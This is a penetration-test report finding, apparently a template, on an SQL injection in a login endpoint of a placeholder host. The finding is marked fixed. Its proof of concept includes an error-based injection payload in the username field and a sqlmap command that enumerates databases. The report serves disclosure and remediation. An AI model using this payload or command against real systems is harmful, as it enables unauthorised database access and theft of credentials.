---
title: SQL Injection in login form
cvss: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
category: "CWE-89: SQL Injection"
affected:
  - POST /api/v2/auth/login
references:
  - "[OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)"
  - https://cwe.mitre.org/data/definitions/89.html
retest_status: solved
retest_date: 2026-10-18
evidence:
  - image: assets/sqli-error.svg
    caption: Database version leaked in the error message of `/api/v2/auth/login`
    width: 75%
---
<!-- field:description -->
The `username` parameter of the login endpoint of {{ report.target }} is concatenated
into a SQL query without sanitisation. An attacker can inject arbitrary SQL.

<!-- field:impact -->
Full read/write access to the customer database (≈ 120 000 records, including password hashes).

<!-- field:proof_of_concept -->
The following request returns the database version in the error message:

```http title="POST /api/v2/auth/login" caption="Error-based injection in the username parameter" lines highlight="5"
POST /api/v2/auth/login HTTP/1.1
Host: api.acme.example
Content-Type: application/json

{"username": "admin' AND 1=CAST(version() AS int)--", "password": "x"}
```

The response is shown in the screenshot below.

<!-- field:recommendation -->
Use parameterised queries (prepared statements) for every database access and
apply least privilege to the database account used by the application.

<!-- field:request -->
```bash title="sqlmap" caption="Automated confirmation"
sqlmap -u https://api.acme.example/api/v2/auth/login --data '{"username":"*","password":"x"}' --level 3 --risk 2 --dbs
```

<!-- field:retest_notes -->
The endpoint now uses prepared statements. Injection payloads are rejected with
`400 Bad Request` and no database error is returned.
